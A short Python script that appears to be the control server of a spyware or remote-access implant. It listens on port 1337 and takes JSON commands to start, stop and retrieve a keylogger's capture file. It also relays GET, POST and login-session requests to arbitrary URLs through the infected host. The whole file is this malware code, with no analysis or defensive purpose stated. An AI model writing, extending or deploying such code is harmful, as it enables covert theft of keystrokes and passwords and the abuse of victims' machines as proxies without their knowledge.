#!/usr/bin/python3

ADDRESS = "";
PORT = 1337;

import http.server as hs;
from modules.Tunnel import tunnel;
from modules.Keylogger import logger;
from urllib.parse import urlparse;
import json;

class CustomRequestHandler(hs.BaseHTTPRequestHandler):
	
	data={"user":""};
	
	def do_GET(self):
		print("\n\n");
		self.send_response(200);
		self.send_header("Content-Type","text/JSON");
		self.send_header("Content-Encoding","ASCII");
		self.end_headers();

		#stuff goes here
		
		if self.data["user"] != self.client_address:
			self.data["user"] = self.client_address;
		
		data = self.rfile.read(int(self.headers["content-length"]));
		data = str(data).strip("b'").strip("'");
		data = json.loads(data);
		
		res = self.execute(data);
		
		#self.wfile.write(b"GET-ed Successfully!");
		self.wfile.write(res);
		return;

	def execute(self,params):
		print("GOT ",params);
		action = params["action"];
		value = params["value"];
		extras = params["extras"]
		ret = None; #To be returned at end
		
		if action == "tunnel":
			if "tunnel_obj" not in self.data.keys():
				self.data["tunnel_obj"] = tunnel.Tunnel();
			tunnel_obj = self.data["tunnel_obj"]; #retrieve tunnel object
			url = value;
			if params["sub_action"] == "get":
				ret = tunnel_obj.get(url);
			elif params["sub_action"] == "post":
				ret = tunnel_obj.post(url);
			elif params["sub_action"] == "session":
				ret = tunnel_obj.session(url);
			elif params["sub_action"] == "login session":
				ret = ret = tunnel_obj.login_session(url,extras);
			self.data["tunnel_obj"] = tunnel_obj; #store tunnel object
		elif action == "keylogger":
			sub_act = params["sub_action"];
			if sub_act == "start":
				ret = logger.start();
			elif sub_act == "stop":
				ret = logger.stop();
			elif sub_act == "get":
				ret = logger.get_file();
		
		return(ret);

if __name__ == "__main__":
	server_addr = (ADDRESS,PORT);
	request_handler = CustomRequestHandler;
	http_daemon = hs.HTTPServer(server_addr,request_handler);

	try:
		print("Starting server on port "+str(PORT));
		http_daemon.serve_forever();
	except KeyboardInterrupt:
		print("\n\nKilling Server...");
		exit();
